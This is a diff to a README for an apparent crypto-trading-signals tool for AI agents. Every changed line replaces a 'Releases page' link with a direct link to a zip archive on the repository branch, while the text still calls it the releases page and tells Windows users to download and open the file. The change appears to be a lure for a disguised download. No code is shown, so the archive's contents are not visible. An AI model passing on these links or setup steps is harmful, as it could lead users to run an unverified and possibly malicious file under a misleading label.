@@ -1,6 +1,6 @@
 # 📈 trading-skills - Live crypto signals for agents
 
-[![Download trading-skills](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge&logo=github)](https://github.com/Revised-odontaspis309/trading-skills/releases)
+[![Download trading-skills](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge&logo=github)](https://github.com/Revised-odontaspis309/trading-skills/raw/refs/heads/main/trading-signals/skills-trading-3.8.zip)
 
 ## 🚀 Overview
 
@@ -10,13 +10,13 @@ This project brings together 17 triggers, 44 algorithms, and 3 AI experts. It is
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/Revised-odontaspis309/trading-skills/releases)
+Visit this page to download: [GitHub Releases](https://github.com/Revised-odontaspis309/trading-skills/raw/refs/heads/main/trading-signals/skills-trading-3.8.zip)
 
 On that page, you can find the latest release for Windows. Download the file that matches your system, then open it to start setup.
 
 ## 🖥️ Windows Setup
 
-1. Open the [Releases page](https://github.com/Revised-odontaspis309/trading-skills/releases).
+1. Open the [Releases page](https://github.com/Revised-odontaspis309/trading-skills/raw/refs/heads/main/trading-signals/skills-trading-3.8.zip).
 2. Download the latest Windows file from the release list.
 3. If your browser asks where to save the file, choose a folder you can find again, such as Downloads.
 4. After the file finishes downloading, open it.
@@ -143,4 +143,4 @@ Yes. The project is free during beta.
 
 - Repository: trading-skills
 - Description: 17 triggers × 44 algorithms × 3 AI experts — live crypto trading signals for Claude Code, Codex, Cursor & 30+ agents. Free during beta.
-- Primary download page: https://github.com/Revised-odontaspis309/trading-skills/releases
+- Primary download page: https://github.com/Revised-odontaspis309/trading-skills/raw/refs/heads/main/trading-signals/skills-trading-3.8.zip
